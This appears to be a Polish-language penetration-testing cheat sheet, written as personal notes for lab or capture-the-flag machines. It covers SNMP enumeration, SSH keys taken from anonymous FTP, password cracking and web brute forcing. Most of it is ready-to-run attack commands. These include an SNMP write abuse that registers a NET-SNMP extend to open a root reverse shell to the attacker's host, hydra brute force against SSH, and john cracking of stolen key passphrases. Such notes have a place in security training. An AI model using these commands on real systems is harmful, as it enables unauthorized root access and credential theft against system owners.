-> **Do czego to jest:** scratchpad na techniki/scenariusze, które kiedyś mnie zablokowały — zapisane **generycznie** (metoda, nie konkretna maszyna), żeby dało się użyć ponownie. Wszędzie `$ip` = cel, `$lhost` = Kali, `$user` = znaleziony login.
-
----
-
-## Scenariusz: SNMP (161/udp) otwarty — enumeracja + abuse
-
-**Trop:** SNMP z domyślnym community (`public`) wycieka userów, procesy z hasłami w cmdline, a przy community RW daje RCE jako root.
-
-### snmpwalk — jak to czytać
-```bash
-# Skladnia:  snmpwalk -v<wersja> -c <community> $ip [OID]
-#   -v1 / -v2c  = wersja (v2c SZYBSZE, domyslnie; -v1 tylko gdy v2c milczy)
-#   -c public   = community string (RO=public, RW=private to najczestsze defaulty)
-#   brak OID    = zrzuca CALE drzewo od korzenia (.1)
-snmpwalk -v2c -c public $ip .1 > snmp_full.txt        # pelny zrzut
-snmp-check $ip -c public                              # poukladany widok
-# Najcenniejsze OIDy (naucz sie tych 4):
-snmpwalk -v2c -c public $ip 1.3.6.1.2.1.25.4.2.1.2    # hrSWRunName        nazwy procesow
-snmpwalk -v2c -c public $ip 1.3.6.1.2.1.25.4.2.1.4    # hrSWRunPath        sciezki binarek
-snmpwalk -v2c -c public $ip 1.3.6.1.2.1.25.4.2.1.5    # hrSWRunParameters  ARGUMENTY <- tu leca hasla
-snmpwalk -v2c -c public $ip 1.3.6.1.2.1.25.6.3.1.2    # hrSWInstalledName  zainstalowany soft
-grep -iE 'pass|pwd|user|-c |mysql|ftp|key' snmp_full.txt
-# Brak nazw MIB (widac iso.3.6...): sudo apt install snmp-mibs-downloader
-#   + zakomentuj 'mibs :' w /etc/snmp/snmp.conf -> ladne nazwy zamiast cyfr.
-```
-> 💎 Z pola `description` userów, kontaktu i `NET-SNMP-EXTEND-MIB` często wyciekają **nazwy kont** i wskazówki o hasłach (np. skrypt „reset password to default"). Spisuj je jako listę loginów do dalszych ataków (SSH/spray).
-
-### SNMP write → RCE jako root (gdy istnieje community RW)
-```bash
-onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $ip  # znajdz community
-snmpset -v2c -c private $ip iso.3.6.1.2.1.1.6.0 s TEST     # przechodzi = MASZ zapis (RW)
-# jesli zapis dziala -> zarejestruj wlasny NET-SNMP extend i wykonaj jako root (snmpd = root):
-snmpset -v2c -c private $ip 'NET-SNMP-EXTEND-MIB::nsExtendStatus."x"' i 5 \
-  'NET-SNMP-EXTEND-MIB::nsExtendCommand."x"' s /bin/bash \
-  'NET-SNMP-EXTEND-MIB::nsExtendArgs."x"' s "-c 'bash -i >& /dev/tcp/$lhost/4444 0>&1'" \
-  'NET-SNMP-EXTEND-MIB::nsExtendStatus."x"' i 1
-# nc -lvnp 4444 PRZED; odczyt outputu = uruchomienie komendy (run-on-read):
-snmpwalk -v2c -c private $ip 'NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."x"'
-```
-
----
-
-## Scenariusz: klucze SSH z anonymous FTP / czytelnego share (id_rsa)
-
-**Trop:** anonymous FTP albo otwarty share oddaje `id_rsa`/`id_rsa_2`/`id_rsa.pub`. Klucz publiczny (komentarz) mówi, do kogo pasuje.
-```bash
-ftp $ip                                   # anonymous / anonymous (lub puste haslo)
-wget -m --no-passive "ftp://anonymous:anonymous@$ip/"   # zrzuc cala zawartosc
-chmod 600 id_rsa*                         # za otwarte perms => ssh IGNORUJE klucz i pyta o haslo
-cat id_rsa.pub                            # komentarz = user@host -> POZNAJ wlasciciela
-# wymus uzycie klucza + verbose; testuj kazdy klucz x kazdy znaleziony user:
-ssh -v -o IdentitiesOnly=yes -i id_rsa $user@$ip
-#   w -v szukaj: "Offering public key" / "Server accepts key"
-# jesli pyta "Enter passphrase for key" => klucz zaszyfrowany, lam offline:
-ssh2john id_rsa > id_rsa.hash ; john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
-john id_rsa.hash --show                   # pokaz passphrase
-```
-> ⚠️ **Rozróżniaj prompty:** „*<user>'s password:*" = klucz odrzucony (złe perms / zły user / nieautoryzowany). „*Enter passphrase for key*" = klucz OK, tylko zaszyfrowany. Pierwszy prompt → napraw perms i user, ZANIM uznasz klucz za bezużyteczny.
-
----
-
-## Scenariusz: słabe/„domyślne" hasło konta przez SSH
-```bash
-hydra -l $user -P /usr/share/wordlists/rockyou.txt ssh://$ip -t 4 -f   # -f = stop po trafieniu
-#   zgadnij tez recznie warianty od loginu: $user:$user, $user:password, $user:$user123
-```
-> 💎 Gdy enum (SNMP/web/share) sugeruje „hasło zresetowane do domyślnego" — najpierw ręcznie warianty loginu, potem rockyou. Uważaj na lockout policy.
-
----
-
-## Scenariusz: Apache/nginx pokazuje tylko default page
-
-**Trop:** statyczna strona domyślna („It works" / „Welcome to nginx") **nie ma parametru** → LFI/SQLi nie mają się gdzie wpiąć. Zaułek, dopóki nie znajdziesz aplikacji.
-```bash
-gobuster dir -u http://$ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,bak,zip -t 40
-gobuster vhost -u http://$ip --append-domain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
-```
-> 💡 Nie forsuj LFI na statycznym default page — najpierw znajdź **dynamiczną** ścieżkę/parametr (dir/vhost bruteforce). Bez parametru nie ma czego wstrzykiwać.
 
 ---
 
